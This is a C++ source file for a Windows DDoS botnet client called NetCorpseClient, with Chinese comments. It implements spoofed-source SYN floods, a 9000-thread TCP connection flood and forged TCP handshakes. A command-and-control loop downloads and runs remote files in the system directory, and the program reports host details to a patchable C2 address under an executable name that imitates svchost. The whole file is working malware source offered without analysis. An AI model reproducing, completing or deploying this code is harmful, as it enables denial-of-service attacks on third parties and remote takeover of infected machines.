// NetCorpseClient.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "NetCorpseClient.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#include "winsock2.h"
#include "Ws2tcpip.h"

#include "WSocket.h"
#include <STDIO.H>
#include <stdlib.h>
	
#pragma comment(lib, "ws2_32.lib")

#define SIO_RCVALL            _WSAIOW(IOC_VENDOR,1)


bool bStopFlag = true;

#define SEQ 0x28376839 

#define FAKE_IP "10.168.150.1" //伪装IP的起始值，本程序的伪装IP覆盖一个B类网段 

#define STATUS_FAILED 0xFFFF //错误返回值 


#define CONNECT_IP "IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII"
#define CONNECT_PORT "PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP"
#define ServiceName "SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
#define ExeName "svchcst.exe"
 

typedef struct _iphdr //定义IP首部 
{ 	
	unsigned char h_verlen; //4位首部长度,4位IP版本号 	
	unsigned char tos; //8位服务类型TOS 	
	unsigned short total_len; //16位总长度（字节） 	
	unsigned short ident; //16位标识 	
	unsigned short frag_and_flags; //3位标志位 	
	unsigned char ttl; //8位生存时间 TTL 	
	unsigned char proto; //8位协议 (TCP, UDP 或其他) 	
	unsigned short checksum; //16位IP首部校验和 	
	unsigned int sourceIP; //32位源IP地址 	
	unsigned int destIP; //32位目的IP地址 	
}IP_HEADER; 


struct //定义TCP伪首部 
{ 	
	unsigned long saddr; //源地址 	
	unsigned long daddr; //目的地址 	
	char mbz; 	
	char ptcl; //协议类型 	
	unsigned short tcpl; //TCP长度 	
}psd_header; 


typedef struct _tcphdr //定义TCP首部 
{ 	
	USHORT th_sport; //16位源端口 	
	USHORT th_dport; //16位目的端口 	
	unsigned int th_seq; //32位序列号 	
	unsigned int th_ack; //32位确认号 	
	unsigned char th_lenres; //4位首部长度/6位保留字 	
	unsigned char th_flag; //6位标志位 	
	USHORT th_win; //16位窗口大小 	
	USHORT th_sum; //16位校验和 	
	USHORT th_urp; //16位紧急数据偏移量 	
}TCP_HEADER; 


//CheckSum:计算校验和的子函数 
USHORT checksum(USHORT *buffer, int size) 
{ 	
	unsigned long cksum=0; 
	
	while(size >1) 
	{ 		
		cksum+=*buffer++; 		
		size -=sizeof(USHORT); 		
	} 
	
	if(size ) 
	{ 		
		cksum += *(UCHAR*)buffer; 		
	} 
	
	cksum = (cksum >> 16) + (cksum & 0xffff); 	
	cksum += (cksum >>16); 
	
	return (USHORT)(~cksum); 	
} 

typedef struct _syn_dest_para
{
		char		port[6];
		char		IP[32];
}SYN_DEST_PARA;

DWORD WINAPI LandDDOSFunction(LPVOID lpParam);


DWORD WINAPI DownThread(LPVOID lpParam);
//===============================================================
//D.O.S攻击部分
int ActtackByDOS(char *strIP, int nPort);

char    ATTACKIP[256];
USHORT    ATTACKPORT =    135;
USHORT    StartPort = 1;
int        SLEEPTIME =    2000;
UCHAR* optbuf = NULL;    //  选项字节
char* psend = NULL;
DWORD len = 0;
USHORT optlen= 0;

typedef struct ip_head      
{ 
    unsigned char h_verlen;     
    unsigned char tos;         
    unsigned short total_len;  
    unsigned short ident;      
    unsigned short frag_and_flags; 
    unsigned char ttl;         
    unsigned char proto;     
    unsigned short checksum;   
    unsigned int sourceIP;     
    unsigned int destIP;        
}IPHEADER;

typedef struct tcp_head  
{ 
    USHORT th_sport;          
    USHORT th_dport;         
    unsigned int th_seq;      
    unsigned int th_ack;      
    unsigned char th_lenres;      
    unsigned char th_flag;      
    USHORT th_win;          
    USHORT th_sum;          
    USHORT th_urp;          
}TCPHEADER; 

typedef struct tsd_hdr  
{ 
    unsigned long saddr;   
    unsigned long daddr;   
    char mbz; 
    char ptcl;               
    unsigned short tcpl;  
}PSDHEADER;

typedef struct attack_obj
{
    DWORD    dwIP;
    USHORT    uAttackPort[11];
    struct attack_obj*    Next;
}ATOBJ;


ATOBJ*    ListAttackObj=0;

////////////////////////////////////////////////////
BOOL    InitStart();
DWORD    GetHostIP();
//USHORT    checksum(USHORT *buffer, int size);
DWORD    WINAPI  ThreadSynFlood(LPVOID lp);

void SendData(DWORD SEQ1, DWORD ACK1, USHORT SPort1, 
				 USHORT APort1, DWORD SIP1, DWORD AIP1, 
				 char* pBuf1, BOOL Isdata1, DWORD dwSize1);
DWORD   WINAPI  ListeningFunc(LPVOID lpvoid);

void debugip ( DWORD dwip);
void ConvertOpt (CHAR* pu);
////////////////////////////////////////////////////

SOCKET sock = NULL;

BOOL InitStart()
{
    BOOL flag;
    int  nTimeOver;
    WSADATA WSAData; 
    if (WSAStartup(MAKEWORD(2,2), &WSAData)!=0)
    { 
        printf("WSAStartup Error!\n");
        return FALSE;
    }
    ListAttackObj = (ATOBJ*) calloc (1,sizeof(ATOBJ));
    ListAttackObj->dwIP = inet_addr( ATTACKIP );
    ListAttackObj->uAttackPort[0] = htons(ATTACKPORT);
    ListAttackObj->uAttackPort[1] = 0;
    ListAttackObj->Next=NULL;
    sock=NULL;
    if ((sock=socket(AF_INET,SOCK_RAW,IPPROTO_IP))==INVALID_SOCKET)
    {
        printf("Socket Setup Error!\n");
        return FALSE;
    }
    flag=true; 
    if (setsockopt(sock,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag))==SOCKET_ERROR) 
    { 
        printf("setsockopt IP_HDRINCL error!\n");
        return FALSE; 
    } 
    nTimeOver=2000;
    if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&nTimeOver, sizeof(nTimeOver))==SOCKET_ERROR)                                //设置发送的时间
    {
        printf("setsockopt SO_SNDTIMEO error!\n");
        return FALSE; 
    }    
    return TRUE;
}

DWORD  WINAPI  ThreadSynFlood(LPVOID lp)
{
    ATOBJ* pAtObj = ListAttackObj;
    SOCKADDR_IN addr_in;
    IPHEADER ipHeader;
    TCPHEADER tcpHeader;
    PSDHEADER psdHeader;
    char szSendBuf[1024]={0};
    int i=0;
    while (  pAtObj != NULL )
    {
        addr_in.sin_family=AF_INET;
        addr_in.sin_addr.S_un.S_addr=pAtObj->dwIP;
        ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
        ipHeader.tos=0;
        ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader)+optlen);     //IP总长度
        ipHeader.ident=1;
        ipHeader.frag_and_flags=0x0040;                
        ipHeader.ttl=0x80;         
        ipHeader.proto=IPPROTO_TCP;
        ipHeader.checksum=0;
        ipHeader.destIP=pAtObj->dwIP;
        ipHeader.sourceIP = GetHostIP();
        tcpHeader.th_ack=0;    
        tcpHeader.th_lenres = (optlen/4+5)<<4;
        tcpHeader.th_flag=2;             
        tcpHeader.th_win=htons(0x4470);
        tcpHeader.th_urp=0;
        tcpHeader.th_seq=htonl(0x00198288);
        for ( int l=StartPort; l<65535;l++)
        {
            int k =0;
            while ( pAtObj->uAttackPort[k] != 0 )
            {
                tcpHeader.th_dport=pAtObj->uAttackPort[k++];
                psdHeader.daddr=ipHeader.destIP;
                psdHeader.mbz=0;
                psdHeader.ptcl=IPPROTO_TCP;
                psdHeader.tcpl=htons(sizeof(tcpHeader));
                int sendnum = 0;            
                int optlentemp = optlen;
                tcpHeader.th_sport=htons(l);
                tcpHeader.th_sum=0;
                psdHeader.saddr=ipHeader.sourceIP;
                memcpy(szSendBuf, &psdHeader, sizeof(psdHeader)); 
                memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader)); 
                memcpy(szSendBuf+sizeof(psdHeader)+sizeof(tcpHeader),optbuf,optlentemp);
                tcpHeader.th_sum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader)+optlentemp); 
                tcpHeader.th_sum = htons(ntohs(tcpHeader.th_sum)-(USHORT)optlentemp);        
                memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
                memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));
                memcpy(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader),optbuf,optlentemp);
                int rect=sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader)+optlentemp, 0, (struct sockaddr*)&addr_in, sizeof(addr_in));
                if ( sendnum++ > 10 )
                {
                    sendnum=0;
                }
                if (rect==SOCKET_ERROR)
                { 
                    printf("send error!:%x\n",WSAGetLastError());
                    return false;
                }
                else    printf("            send ok %d \n", l);                    
            }//endwhile
            Sleep(SLEEPTIME);  
        }
        pAtObj = pAtObj->Next;
    }
    return 0;
}

DWORD GetHostIP()
{
    DWORD dwIP=0;
    int i=0;
    struct hostent* lp = NULL;
    char HostName[255] = {0};
    gethostname(HostName,255);
    lp = gethostbyname (HostName);
    while ( lp->h_addr_list[i] != NULL )
        i++;
    dwIP = *(DWORD*)lp->h_addr_list[--i];
    return dwIP;
}
 
void SendData(DWORD SEQ1, DWORD ACK1, USHORT SPort1, 
				 USHORT APort1, DWORD SIP1, DWORD AIP1, 
				 char* pBuf1, BOOL Isdata1, DWORD dwSize1)

{
 
    SOCKADDR_IN addr_in;
    IPHEADER ipHeader;
    TCPHEADER tcpHeader;
    PSDHEADER psdHeader;

    char szSendBuf[1024]={0};
    addr_in.sin_family=AF_INET; 
    addr_in.sin_port = APort1;
    addr_in.sin_addr.S_un.S_addr = AIP1;
    ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
    ipHeader.tos=0;

    ipHeader.ident=1;
    ipHeader.frag_and_flags=0x0040;                
    ipHeader.ttl=0x80;         
    ipHeader.proto=IPPROTO_TCP;
    ipHeader.checksum=0;
    ipHeader.destIP=AIP1;
    ipHeader.sourceIP = SIP1;
    tcpHeader.th_dport = APort1;
    tcpHeader.th_ack = ACK1;   
    tcpHeader.th_lenres=(sizeof(tcpHeader)/4<<4|0);
    tcpHeader.th_seq= SEQ;
    tcpHeader.th_win=htons(0x4470);
    tcpHeader.th_sport=SPort1;
    ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader)+dwSize1);
    if ( !Isdata1)
    {

        tcpHeader.th_flag=0x10;
    
    }//    ack   
    else
    {
        tcpHeader.th_flag=0x18;
    }
    tcpHeader.th_urp=0;
    psdHeader.daddr=ipHeader.destIP;
    psdHeader.mbz=0;
    psdHeader.ptcl=IPPROTO_TCP;
    psdHeader.tcpl=htons(sizeof(tcpHeader));    
    tcpHeader.th_sum=0;
    psdHeader.saddr=ipHeader.sourceIP;
    memcpy(szSendBuf, &psdHeader, sizeof(psdHeader)); 
    memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader));
    if ( pBuf1 != NULL )
    {    
        memcpy(szSendBuf+sizeof(psdHeader)+sizeof(tcpHeader),pBuf1,dwSize1);
        tcpHeader.th_sum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader)+dwSize1); 
        tcpHeader.th_sum = htons(ntohs(tcpHeader.th_sum)-(USHORT)dwSize1);
    }
    else
    {
        tcpHeader.th_sum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader));
    }

    memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
    memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));
    int rect=0;
    if ( pBuf1 == NULL )
        rect=sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader), 0, (struct sockaddr*)&addr_in, sizeof(addr_in));
    else
    {
        memcpy(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), pBuf1, dwSize1);
        rect=sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader)+dwSize1, 0, (struct sockaddr*)&addr_in, sizeof(addr_in));
    }

    if (rect==SOCKET_ERROR)
    { 
        printf("send error!:%x\n",WSAGetLastError());
        return;
    }
    else    
    {
        if ( pBuf1 != NULL )
            printf("SendData ok %d\n",ntohs(SPort1));
        else
            printf("                    SendAck ok %d\n",ntohs(SPort1));
    }
 
}


DWORD   WINAPI  ListeningFunc(LPVOID lpvoid)
{
    SOCKET rawsock;
    SOCKADDR_IN addr_in={0};
    if ((rawsock=socket(AF_INET,SOCK_RAW,IPPROTO_IP))==INVALID_SOCKET)
    {
        printf("Sniffer Socket Setup Error!\n");
        return false;
    }
    addr_in.sin_family=AF_INET;
    addr_in.sin_port=htons(8288);
    addr_in.sin_addr.S_un.S_addr= (DWORD)lpvoid;
    //对rawsock绑定本机IP和端口
    int ret=bind(rawsock, (struct sockaddr *)&addr_in, sizeof(addr_in));
    if(ret==SOCKET_ERROR)
    {
        printf("bind false\n");
        exit(0);
    }
    DWORD lpvBuffer = 1; 
    DWORD lpcbBytesReturned = 0;
    WSAIoctl(rawsock, SIO_RCVALL, &lpvBuffer, sizeof(lpvBuffer), NULL, 0, &lpcbBytesReturned, NULL, NULL); 
    while (TRUE)
    {
		if(bStopFlag) break;

        SOCKADDR_IN from={0};
        int  size=sizeof(from);
        char RecvBuf[256]={0};
        //接收数据包
        ret=recvfrom(rawsock,RecvBuf,sizeof(RecvBuf),0,(struct sockaddr*)&from,&size);
        if(ret!=SOCKET_ERROR)
        {
            // 分析数据包
            IPHEADER *lpIPheader;
            lpIPheader=(IPHEADER *)RecvBuf;
            if (lpIPheader->proto==IPPROTO_TCP && lpIPheader->sourceIP == inet_addr(ATTACKIP) )
            {
            
                TCPHEADER *lpTCPheader=(TCPHEADER*)(RecvBuf+sizeof(IPHEADER));
                //判断是不是远程开放端口返回的数据包
                if ( lpTCPheader->th_flag==0x12)
                {
                    if ( lpTCPheader->th_ack == htonl(0x00198289) )
                    {//伪造第3次握手
                        SendData(lpTCPheader->th_ack,htonl(ntohl(lpTCPheader->th_seq)+1), \
                        lpTCPheader->th_dport,lpTCPheader->th_sport,lpIPheader->destIP,lpIPheader->sourceIP,NULL,FALSE,0);
                        //主动发出一次数据
                        SendData(lpTCPheader->th_ack,htonl(ntohl(lpTCPheader->th_seq)+1), \
                        lpTCPheader->th_dport,lpTCPheader->th_sport,lpIPheader->destIP,lpIPheader->sourceIP,psend,TRUE,len);
                    }
                
                }
                else
                {
                    if ( lpTCPheader->th_flag == 0x10 )
                    //继续发送数据
                    SendData(lpTCPheader->th_ack,lpTCPheader->th_seq,\
                    lpTCPheader->th_dport,lpTCPheader->th_sport,lpIPheader->destIP,lpIPheader->sourceIP,psend,TRUE,len);
                }

            }            
            
        }
    }     // end while

	return 0;
}


void debugip ( DWORD dwip)
{

    struct in_addr A = {0};
    A.S_un.S_addr = dwip;
    printf("%s",inet_ntoa(A));

}

void ConvertOpt (CHAR* pu)
{
    int i=0 , lentemp;
    lentemp = strlen(pu);
    optlen = lentemp/2;
    optbuf = (UCHAR*)malloc(optlen);
    int k=0;
    for ( i = 0 ; i < lentemp ; i+=2 )
    {
        BYTE tempb = 0;
        tempb = pu[i+1];
        if ( tempb < '9')
            tempb = tempb - 0x30;
        else
        {
            tempb = tempb - 0x37;
        }

        optbuf[k] = tempb;

        tempb = 0;
        tempb = pu[i];
        if ( tempb < '9')
            tempb = tempb - 0x30;
        else
        {
            tempb = tempb - 0x37;
        }

        tempb= tempb<<4;
        optbuf[k]+= tempb;
        k++;
    }
}


int ActtackByDOS(char *strIP, int nPort)
{
 
    psend = (char*)malloc(800);
    memset(psend, 0x38, 799);
    psend[799] = 0;

    len = strlen(psend);

	memset(ATTACKIP, 0, sizeof(ATTACKIP));
    sprintf(ATTACKIP, "%s", strIP);
    ATTACKPORT = nPort;

    CHAR* optbuftemp = (CHAR*)"020405B401010402";      //攻击内容 
    ConvertOpt (optbuftemp);

    optbuf[3]-=1;

    SLEEPTIME = 2000;
    StartPort = 65530;

    char HostName[255]={0};

    if ( InitStart() == FALSE )
        return -1;

	try
	{
		if ( optbuf != NULL)
		{
			int i=0;
			struct hostent* lp = NULL;
        
			gethostname(HostName, 255);
			lp = gethostbyname (HostName);
			while ( lp->h_addr_list[i] != NULL )
			{
				if(bStopFlag)
				{
					break;
				}

				HANDLE    h=NULL;
				DWORD    dwIP=0;    
				dwIP = *(DWORD*)lp->h_addr_list[i++];
				h = CreateThread(NULL, NULL, ListeningFunc, (LPVOID)dwIP,NULL,NULL);            
				if ( h == NULL )
				{
					return -1;
				}
				Sleep(500);
			}
				ThreadSynFlood(NULL);
		}
		else return -1;

	} catch(...){}

	return 0;
 }


//===============================================================
//tcp攻击部分
DWORD WINAPI ThreadTCPProc(LPVOID lpParam)
{
	SYN_DEST_PARA *destpara = (SYN_DEST_PARA *)lpParam;	
	char c_strHost[50];
	memset(c_strHost, 0, 50);
	sprintf(c_strHost, "%s", destpara->IP); 
	int nPort = atoi(destpara->port); 
	while(1)
	{
		if(bStopFlag)
		{
			break;
		}

		CWSocket m_wskClient;
		int m_bConnected = m_wskClient.Connection(c_strHost, nPort);

		Sleep(500);

	}
	
	return 0;
}

//====================================================================
#include "TokenEx.h"

#include "CpuUsage.h"
CCpuUsage usageA;

CString GetOsVersion(void);
CString GetComputerNameInfo(void);
CString GetCPURate(void);
CString GetInfo(void);

#include "CConnection.h"



int g_nSendMessageErrorCount = 0;

CConnection Connection;


void ReceiveCallback (DWORD ptr)
{
	char buff[1024] = "";
	CConnection* c = reinterpret_cast <CConnection*> (ptr);
	
	if(c == NULL) return;
	
	try
	{
		c->Receive (buff, 1024);
		
		CString strGetData = buff;
		
		CTokenEx tok;
		
		CStringArray SplitIt;	
		
		tok.Split(strGetData, "[=NCS=]", SplitIt, TRUE);
		
		
		
		int nSize = SplitIt.GetSize();
		
		if(nSize > 2 && SplitIt.GetAt(0).Compare("CMDINFO") == 0 && SplitIt.GetAt(nSize - 1).Compare("CMDINFO") == 0)
		{
			//下载并执行
			if(SplitIt.GetAt(1).Compare("DOWN") == 0)
			{
				LPTSTR p = (LPSTR)(LPCTSTR)SplitIt.GetAt(2);
				
				DWORD tid;
				CreateThread(NULL, 0, DownThread, (LPVOID)(LPTSTR)p, 0, &tid);
			}
			//D.O.S攻击
			if(SplitIt.GetAt(1).Compare("D.O.S") == 0)
			{
				if(!bStopFlag) return;
				
				bStopFlag = false;
				
				int nPort = atoi((LPSTR)(LPCTSTR)SplitIt.GetAt(3));
				char sIP[50];
				memset(sIP, 0, 50);
				sprintf(sIP, "%s", SplitIt.GetAt(2));

				ActtackByDOS(sIP, nPort);
			}
			//tcp连接攻击
			else if(SplitIt.GetAt(1).Compare("TCP") == 0)
			{
				if(!bStopFlag) return;
				
				bStopFlag = false;
				
				DWORD uiThreadID;
				
				SYN_DEST_PARA *destpara;
				
				destpara=new SYN_DEST_PARA;
				memset(destpara,0,sizeof(destpara));
				
				strcpy(destpara->IP,(LPSTR)(LPCTSTR)SplitIt.GetAt(2));
				strcpy(destpara->port,(LPSTR)(LPCTSTR)SplitIt.GetAt(3));

				for(int i = 0; i < 9000; i++)
				{
					CreateThread(NULL, 0, ThreadTCPProc, (LPVOID)(SYN_DEST_PARA*)destpara,0,&uiThreadID);			
				}
			}
			//停止攻击
			else if((SplitIt.GetAt(1).Compare("DDOSSTOP") == 0) || 
				(SplitIt.GetAt(1).Compare("D.O.SSTOP") == 0)    ||
				(SplitIt.GetAt(1).Compare("TCPSTOP") == 0))
			{
				bStopFlag = true;
			}
		}	
	}
	catch(...)
	{
		
	}
}

void CloseCallback (DWORD ptr)
{
	//AfxMessageBox ("The connection was closed.", 0, MB_OK | MB_ICONINFORMATION);
	//Connection.Connect (CONNECT_IP, CONNECT_PORT);
}

CString GetOsVersion(void)
{
    MEMORYSTATUS memstat;
    OSVERSIONINFO verinfo;
    DWORD dwNameSize = MAX_COMPUTERNAME_LENGTH + 1;
    
    GlobalMemoryStatus(&memstat); // load memory info into memstat
    verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
    GetVersionEx(&verinfo); // load version info into verinfo
    char *os;
    if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
        if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
        if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
    }
    else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "Win98";
    else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "WinME";
    else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "Win2000";
    else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "WinXP";
    else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "Win2003";
    else os = "???";

	CString str = os;
	return str;
}

CString GetComputerNameInfo(void)
{
	char szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD dwNameSize = MAX_COMPUTERNAME_LENGTH + 1;

	GetComputerName(szBuffer, &dwNameSize);

	CString str = szBuffer;

	return str;
}

CString GetCPURate(void)
{	
	int SystemWideCpuUsage = usageA.GetCpuUsage();

	CString str;
	str.Format("%d%%",SystemWideCpuUsage);
	
	return str;
}

CString GetInfo(void)
{
	CString str;
	str = "SYSINFO";
	str += "[=NCC=]";
	
	str += GetComputerNameInfo();
	str += "[=NCC=]";
	
	str += GetOsVersion();
	str += "[=NCC=]";
	
	str += GetCPURate();
	str += "[=NCC=]";
	
	CString strStatus;
	if(bStopFlag)
	{
		strStatus = "空闲";
	}
	else
	{
		strStatus = "攻击";
	}
	
	str += strStatus;
	str += "[=NCC=]";
	
	str += "1.0";
	str += "[=NCC=]";
	
	str += "SYSINFO";
	str += "[=NCC=]";
	return str;
}


bool DownFile(CString strURL,CString strFilePathName)
{
	bool bFlag = false;

	int nCount = 0;
    while(1)
	{
		nCount++;

		HRESULT h = URLDownloadToFile(0, strURL, strFilePathName, 0, 0);
		if(h ==S_OK)  
		{
			bFlag = true;
			break;
		}

		if(nCount > 3) break;

		Sleep(60000);
	}	 

	 return bFlag;	 
}

void Create_Process(const char *temp_exe, BOOL async)
{
	HANDLE hProcess;
     HANDLE hThread;
     PROCESS_INFORMATION PI;
     STARTUPINFO SI;

     memset(&SI, 0, sizeof(SI));
     SI.cb = sizeof(SI);
	 CreateProcess(temp_exe, NULL, NULL, NULL, FALSE,NORMAL_PRIORITY_CLASS, NULL, NULL, &SI, &PI);	 

	 hProcess = PI.hProcess;       
     hThread = PI.hThread;
	 //异步执行时，执行后不删除分解后的文件;同步执行时，执行后删除分解后的文件
     if (!async)  //同步执行
     {
          WaitForSingleObject(hProcess, INFINITE);
          unlink(temp_exe);
     }
}

DWORD WINAPI DownThread(LPVOID lpParam)
{
	LPTSTR p = (LPTSTR)lpParam;	

    TCHAR chSystemDir[MAX_PATH];
	GetSystemDirectory(chSystemDir,MAX_PATH);
	CString strSystemDir = chSystemDir;		
	
	CTokenEx tok;
	
	CStringArray SplitIt;	
	
	CString strUrl = p;
	tok.Split(strUrl, "/", SplitIt, TRUE);

	int nSize = SplitIt.GetSize();

	bool bRet = DownFile(strUrl,strSystemDir + "\\" + SplitIt.GetAt(nSize - 1));

	if(bRet) Create_Process(strSystemDir + "\\" + SplitIt.GetAt(nSize - 1), true);				
	
	return 0 ;
}

DWORD WINAPI LandDDOSFunction(LPVOID lpParam)
{
	SYN_DEST_PARA *destpara = (SYN_DEST_PARA *)lpParam;	

	int datasize,ErrorCode,flag,FakeIpNet,FakeIpHost; 	
	int TimeOut=2000,SendSEQ=0; 	
	char SendBuf[128]={0}; 	
	char RecvBuf[65535]={0}; 	
	WSADATA wsaData; 	
	SOCKET SockRaw=(SOCKET)NULL; 	
	struct sockaddr_in DestAddr; 	
	IP_HEADER ip_header; 	
	TCP_HEADER tcp_header; 
	
	//初始化SOCK_RAW 	
	if((ErrorCode=WSAStartup(MAKEWORD(2,1),&wsaData))!=0)
	{ 		
		fprintf(stderr,"WSAStartup failed: %d\n",ErrorCode); 
		bStopFlag = true;		
		return -1; 		
	} 
	
	SockRaw=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED); 
	
	if (SockRaw==INVALID_SOCKET)
	{ 		
		fprintf(stderr,"WSASocket() failed: %d\n",WSAGetLastError()); 
		bStopFlag = true;		
		return -1; 		
	} 
	
	flag=TRUE; 
	
	//设置IP_HDRINCL以自己填充IP首部 	
	ErrorCode=setsockopt(SockRaw,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(int)); 	
	if (ErrorCode==SOCKET_ERROR) printf("Set IP_HDRINCL Error!\n"); 
	
	__try
	{ 		
		//设置发送超时 		
		ErrorCode=setsockopt(SockRaw,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut));		
		if(ErrorCode==SOCKET_ERROR)
		{ 			
			fprintf(stderr,"Failed to set send TimeOut: %d\n",WSAGetLastError()); 			
			__leave; 			
		} 
		
		memset(&DestAddr,0,sizeof(DestAddr)); 		
		DestAddr.sin_family=AF_INET; 		
		DestAddr.sin_addr.s_addr=inet_addr(destpara->IP); 		
		FakeIpNet=inet_addr(FAKE_IP); 		
		FakeIpHost=ntohl(FakeIpNet); 
		
		//填充IP首部 		
		ip_header.h_verlen=(4<<4 | sizeof(ip_header)/sizeof(unsigned long)); 
		
		//高四位IP版本号，低四位首部长度 		
		ip_header.total_len=htons(sizeof(IP_HEADER)+sizeof(TCP_HEADER)); //16位总长度（字节）		
		ip_header.ident=1; //16位标识 		
		ip_header.frag_and_flags=0; //3位标志位 		
		ip_header.ttl=128; //8位生存时间TTL 		
		ip_header.proto=IPPROTO_TCP; //8位协议(TCP,UDP…) 		
		ip_header.checksum=0; //16位IP首部校验和 		
		ip_header.sourceIP=htonl(FakeIpHost+SendSEQ); //32位源IP地址 		
		ip_header.destIP=inet_addr(destpara->IP); //32位目的IP地址
		
		//填充TCP首部 		
		tcp_header.th_sport=htons(7000); //源端口号		
		tcp_header.th_dport=htons(atoi(destpara->port)); //目的端口号		
		tcp_header.th_seq=htonl(SEQ+SendSEQ); //SYN序列号 		
		tcp_header.th_ack=0; //ACK序列号置为0 		
		tcp_header.th_lenres=(sizeof(TCP_HEADER)/4<<4|0); //TCP长度和保留位 		
		tcp_header.th_flag=2; //SYN 标志 		
		tcp_header.th_win=htons(16384); //窗口大小 		
		tcp_header.th_urp=0; //偏移 		
		tcp_header.th_sum=0; //校验和 
		
		//填充TCP伪首部（用于计算校验和，并不真正发送）		
		psd_header.saddr=ip_header.sourceIP; //源地址 		
		psd_header.daddr=ip_header.destIP; //目的地址 		
		psd_header.mbz=0; 		
		psd_header.ptcl=IPPROTO_TCP; //协议类型 		
		psd_header.tcpl=htons(sizeof(tcp_header)); //TCP首部长度 
		
		while(1) 
		{			 
			if(bStopFlag) break;
			
			Sleep(15);
			
			if(SendSEQ++==65536) SendSEQ=1; //序列号循环 
			
			//更改IP首部 			
			ip_header.checksum=0; //16位IP首部校验和 			
			ip_header.sourceIP=htonl(FakeIpHost+SendSEQ); //32位源IP地址 
			
			//更改TCP首部 			
			tcp_header.th_seq=htonl(SEQ+SendSEQ); //SYN序列号 			
			tcp_header.th_sum=0; //校验和 
			
			//更改TCP Pseudo Header 			
			psd_header.saddr=ip_header.sourceIP; 
			
			//计算TCP校验和，计算校验和时需要包括TCP pseudo header 			
			memcpy(SendBuf,&psd_header,sizeof(psd_header));			
			memcpy(SendBuf+sizeof(psd_header),&tcp_header,sizeof(tcp_header));			
			tcp_header.th_sum=checksum((USHORT *)SendBuf,sizeof(psd_header)+sizeof(tcp_header)); 
			
			//计算IP校验和 			
			memcpy(SendBuf,&ip_header,sizeof(ip_header));			
			memcpy(SendBuf+sizeof(ip_header),&tcp_header,sizeof(tcp_header)); 			
			memset(SendBuf+sizeof(ip_header)+sizeof(tcp_header),0,4); 			
			datasize=sizeof(ip_header)+sizeof(tcp_header); 			
			ip_header.checksum=checksum((USHORT *)SendBuf,datasize); 
			
			//填充发送缓冲区 			
			memcpy(SendBuf,&ip_header,sizeof(ip_header)); 
			
			//发送TCP报文 			
			ErrorCode=sendto(SockRaw, 				
				SendBuf, 				
				datasize, 				
				0, 				
				(struct sockaddr*) &DestAddr, 				
				sizeof(DestAddr)); 
			
			if (ErrorCode==SOCKET_ERROR) printf("\nSend Error:%d\n",GetLastError()); 			
		}//End of While 		
	}//End of try 	
	__finally 
	{ 	
		if (SockRaw != INVALID_SOCKET) closesocket(SockRaw); 	
		WSACleanup(); 	
	} 
	
	bStopFlag = true;
	
	return 0; 	
}

DWORD WINAPI sendSR()
{
	//SaveLog(CONNECT_IP);
	//SaveLog(CONNECT_PORT);
	bool bRet = Connection.IsConnected();
	if(!bRet)
	{
		bool bRet = Connection.Connect (CONNECT_IP, atoi(CONNECT_PORT));
		if(bRet)
		{
			CString str = GetInfo();		
			Connection.Send(str,str.GetLength());
		}
	}
	else
	{
		CString str = GetInfo();
		
		int nRet = Connection.Send(str,str.GetLength());
		if(nRet <= 0) 
		{			
			g_nSendMessageErrorCount++;

			if(g_nSendMessageErrorCount > 1)
			{
				bool bRet = Connection.Connect (CONNECT_IP, atoi(CONNECT_PORT));
				if(bRet)
				{
					CString str = GetInfo();		
					Connection.Send(str,str.GetLength());
				}
				g_nSendMessageErrorCount = 0;
			}
		}
	}

	return 0;
}

